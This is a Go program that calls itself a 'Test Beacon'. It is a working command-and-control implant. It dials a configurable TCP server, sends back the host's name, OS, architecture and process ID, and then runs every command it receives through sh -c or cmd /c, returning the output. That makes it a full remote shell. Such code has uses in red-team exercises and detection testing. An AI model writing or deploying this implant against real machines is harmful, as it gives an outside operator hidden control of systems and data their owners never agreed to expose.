package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type BeaconInfo struct {
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	PID      int    `json:"pid"`
}

func main() {
	serverAddr := "127.0.0.1:9090"
	if len(os.Args) > 1 {
		serverAddr = os.Args[1]
	}

	fmt.Printf("[*] Test Beacon connecting to %s\n", serverAddr)

	hostname, _ := os.Hostname()
	info := BeaconInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
	}

	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		fmt.Printf("[!] Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Printf("[+] Connected to C2 as %s (%s/%s) PID:%d\n", info.Hostname, info.OS, info.Arch, info.PID)

	infoJSON, _ := json.Marshal(info)
	conn.Write(append(infoJSON, '\n'))

	buf := make([]byte, 4096)

	for {
		n, err := conn.Read(buf)
		if err != nil {
			if err == io.EOF {
				fmt.Println("[-] C2 disconnected")
			} else {
				fmt.Printf("[!] Read error: %v\n", err)
			}
			return
		}

		cmd := strings.TrimSpace(string(buf[:n]))
		if cmd == "" { continue }

		fmt.Printf("[<] Command: %s\n", cmd)

		switch strings.ToLower(cmd) {
		case "ping", "alive":
			conn.Write([]byte("pong\n"))
			continue
		case "exit", "quit", "disconnect":
			conn.Write([]byte("bye\n"))
			return
		case "id", "whoami":
			conn.Write([]byte(fmt.Sprintf("@ %s [%s/%s] PID:%d Session:%s\n",
				hostname, runtime.GOOS, runtime.GOARCH, os.Getpid(), genSession())))
			continue
		case "help":
			conn.Write([]byte("Commands: ping, id, pwd, ls, shell, exit, or any system command\n"))
			continue
		case "pwd":
			wd, _ := os.Getwd()
			conn.Write([]byte(wd + "\n"))
			continue
		case "ls", "dir":
			var out []byte
			if runtime.GOOS == "windows" {
				out, _ = exec.Command("cmd", "/c", "dir").CombinedOutput()
			} else {
				out, _ = exec.Command("ls", "-la").CombinedOutput()
			}
			conn.Write(out)
			continue
		}

		var result []byte
		if runtime.GOOS == "windows" {
			result, _ = exec.Command("cmd", "/c", cmd).CombinedOutput()
		} else {
			result, _ = exec.Command("sh", "-c", cmd).CombinedOutput()
		}
		if len(result) == 0 {
			result = []byte("[no output]\n")
		}
		conn.Write(result)
	}
}

func genSession() string {
	b := make([]byte, 4); rand.Read(b); return hex.EncodeToString(b)
}
